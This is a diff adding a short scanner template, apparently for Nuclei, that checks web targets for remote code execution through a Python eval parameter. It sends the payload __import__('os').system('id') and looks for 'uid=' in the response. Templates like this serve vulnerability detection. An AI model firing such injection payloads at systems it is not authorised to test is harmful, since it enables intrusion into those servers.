@@ -1,0 +1,14 @@
+id: rce-python
+info:
+  name: RCE via Python Eval
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?eval=__import__('os').system('id')"
+    matchers:
+      - type: word
+        words:
+          - "uid="
+        part: body
